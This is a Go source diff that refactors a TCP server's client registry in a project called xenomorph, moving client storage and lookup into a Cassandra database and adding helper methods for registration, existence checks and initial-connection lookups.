@@ -1,10 +1,13 @@
 package core
 
 import (
+	"fmt"
 	"net"
 	"sync"
 
 	"github.com/codevault-llc/xenomorph/internal/common"
+	"github.com/codevault-llc/xenomorph/internal/database"
+	"github.com/codevault-llc/xenomorph/internal/shared"
 	"github.com/codevault-llc/xenomorph/pkg/logger"
 	"go.uber.org/zap"
 )
@@ -12,19 +15,21 @@ import (
 type Server struct {
 	Port              string
 	Listener          net.Listener
-	Clients           map[string]*common.ClientData
+	Clients           map[string]*common.ClientListData
 	mu                sync.Mutex
-	BotController     common.BotController
-	MessageController common.MessageController
-	FileController    common.FileController
+	BotController     shared.BotController
+	MessageController shared.MessageController
+	Handler           shared.HandlerController
+	Cassandra         shared.CassandraController
 }
 
-func NewServer(port string, botController common.BotController, messageController common.MessageController) *Server {
+func NewServer(port string) *Server {
+	cassandra := database.NewCassandra()
+
 	return &Server{
-		Port:              port,
-		Clients:           make(map[string]*common.ClientData),
-		BotController:     botController,
-		MessageController: messageController,
+		Port:      port,
+		Clients:   make(map[string]*common.ClientListData),
+		Cassandra: cassandra,
 	}
 }
 
@@ -49,18 +54,25 @@ func (s *Server) Start() error {
 	}
 }
 
-func (s *Server) RegisterClient(data *common.ClientData) (*common.ClientData, error) {
+func (s *Server) RegisterClient(uuid string, data *common.ClientListData) (*common.ClientListData, string, error) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
-	s.Clients[data.UUID] = data
+	s.Clients[uuid] = data
 
-	return data, nil
+	publicKey, err := s.Cassandra.RegisterClient(uuid)
+	if err != nil {
+		logger.Log.Error("Failed to register client in Cassandra", zap.Error(err))
+		return nil, "", err
+	}
+
+	return data, publicKey, nil
 }
 
-func (s *Server) UpdateClient(data *common.ClientData) (*common.ClientData, error) {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-	s.Clients[data.UUID] = data
+func (s *Server) UpdateClient(uuid string, data *common.ClientData) (*common.ClientData, error) {
+	if err := s.Cassandra.UpdateClient(uuid, data); err != nil {
+		logger.Log.Error("Failed to update client in Cassandra", zap.Error(err))
+		return nil, err
+	}
 
 	return data, nil
 }
@@ -70,7 +82,13 @@ func (s *Server) GetClientByAddress(addr net.Addr) *common.ClientData {
 	defer s.mu.Unlock()
 	for _, client := range s.Clients {
 		if client.Addr.String() == addr.String() {
-			return client
+			clientData, err := s.Cassandra.GetClient(client.UUID)
+			if err != nil {
+				logger.Log.Error("Failed to get client from Cassandra", zap.Error(err))
+				return nil
+			}
+
+			return &clientData
 		}
 	}
 
@@ -78,7 +96,52 @@ func (s *Server) GetClientByAddress(addr net.Addr) *common.ClientData {
 }
 
 func (s *Server) GetClientByUUID(uuid string) *common.ClientData {
+	clientData, err := s.Cassandra.GetClient(uuid)
+	if err != nil {
+		logger.Log.Error("Failed to get client from Cassandra", zap.Error(err))
+		return nil
+	}
+
+	return &clientData
+}
+
+func (s *Server) ClientCheck(uuid string) bool {
+	exist, err := s.Cassandra.ClientExists(uuid)
+	if err != nil {
+		logger.Log.Error("Failed to check if client exists in Cassandra", zap.Error(err))
+		return false
+	}
+
+	return exist
+}
+
+func (s *Server) GetClientInitialConnection(uuid string) (*common.ClientListData, error) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
-	return s.Clients[uuid]
+	client, ok := s.Clients[uuid]
+	if !ok {
+		return nil, fmt.Errorf("client not found")
+	}
+
+	return client, nil
+}
+
+func (s *Server) GetClientInitialConnectionFromAddr(addr net.Addr) (*common.ClientListData, error) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	for _, client := range s.Clients {
+		if client.Addr.String() == addr.String() {
+			return client, nil
+		}
+	}
+
+	return nil, fmt.Errorf("client not found")
+}
+
+func (s *Server) GetHandler() shared.HandlerController {
+	return s.Handler
+}
+
+func (s *Server) GetCassandra() shared.CassandraController {
+	return s.Cassandra
 }
